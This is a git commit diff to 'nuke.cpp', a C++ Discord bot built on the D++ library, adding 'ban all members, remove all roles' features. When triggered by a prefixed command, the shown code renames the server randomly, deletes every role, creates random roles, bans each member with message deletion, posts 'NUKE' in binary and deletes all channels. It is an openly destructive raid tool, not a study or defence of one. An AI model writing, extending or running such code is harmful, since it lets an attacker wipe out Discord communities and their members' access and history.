39b69a2ebe731e2f31c870ea532d76112dc4afb8
Electwix <ege.tuzun@gmail.com>
2021-12-29 14:59:48 +0200

    New Feutures * ban all members * remove all roles * create new roles random

--- MyBot/nuke.cpp
+++ MyBot/nuke.cpp
@@ -28,7 +28,7 @@ struct versionsct
     int build = 0;
 };
 
-struct versionsct version = { 0,2,01 };
+struct versionsct version = { 0,4,1 };
 
 
 Json::Value readandfetch()
@@ -87,26 +87,140 @@ int main()
 
     bot.on_message_create([&bot](const auto& event) {
 
+
+
         string str = event.msg.content;
         std::size_t found = str.find_first_of(prefix);
+
+        
+
 
         if (found == 0) {
             if (event.msg.content == prefix + nukecommand)
             {
-
+                cout << dpp::get_user_count();
                 dpp::guild guild = *dpp::find_guild(event.msg.guild_id);
+
+
+
+                guild.set_name(to_string(rand()));
+
+               
+              
+                for (int i = 0; i < guild.roles.size(); i++)
+                {
+                    
+                    bot.role_delete(guild.id, guild.roles[i], [guild, i](const dpp::confirmation_callback_t& callback)
+                        {
+                            if (!callback.is_error())
+                            {
+                                cout << guild.roles[i] << " id role deleted \n";
+                            }
+                        }
+                        
+                        
+                        
+                    );
+                }
+                
+
+
+
+
+
+                for (auto const& member : guild.members)
+                {
+                    
+                    dpp::role newrole;
+                    newrole.set_guild_id(guild.id);
+                    newrole.set_colour(0xfac420);
+                    
+
+                    newrole.set_name(to_string(rand()));
+
+                    
+
+                    
+                    bot.role_create(newrole, [&bot, guild, newrole, member](const dpp::confirmation_callback_t& callback)
+                        {
+
+
+                            if(!callback.is_error())
+                            {
+                                const dpp::role role = get<dpp::role>(callback.value);
+
+                                cout << "\n role id: " << role.id << " \n";
+
+                                cout << "\n Guild id: " << guild.id << "\n";
+               
+                                bot.guild_member_add_role(guild.id, member.second.user_id, role.id, [member](const dpp::confirmation_callback_t& cc) {
+                                // your stuff here
+
+                                if (!cc.is_error())
+                                {
+                                    cout << "hello bro";
+                                }
+                                else
+                                {
+                                    cout << "Error Role Give: " << cc.get_error().message << "\n";
+                                    cout << member.second.user_id << "\n";
+                                } 
+                                });
+                            }
+                            else
+                            {
+                                cout << "Error Role: " << callback.get_error().message << "\n";
+                            }
+
+
+                        }
+                    
+
+
+                    );
+
+
+
+
+
+                    bot.guild_ban_add(guild.id, member.second.user_id, 10, " ", [&bot, member](const dpp::confirmation_callback_t& callback)
+                        {
+                            
+                            if (!callback.is_error())
+                            {
+                                cout << "banned";
+                            }
+                            else
+                            {
+                                cout << "\n Error Ban: " << callback.get_error().message << "\n";
+                                cout << "Name: " << member.second.joined_at << "\n";
+                            }
+                        }
+
+
+
+                    );
+                }
 
                 cout << "\nTotal Channels: " << guild.channels.size() << "\n";
                 int channelsize = guild.channels.size();
                 bot.message_create(dpp::message(event.msg.channel_id, "01001110 01010101 01001011 01000101"));
+                
+             
+
+
                 bot.channels_get(event.msg.guild_id, [&bot, guild](const dpp::confirmation_callback_t& callback) {
 
                     if (!callback.is_error())
                     {
+
+
+
+
                         dpp::channel_map channels = std::get<dpp::channel_map>(callback.value);
                         for (auto const& channel : channels) {
-
-
+                           
+                            
                             std::string channelname = channel.second.name;
                             bot.channel_delete(channel.second.id, [channelname](const dpp::confirmation_callback_t& callback)
                                 {
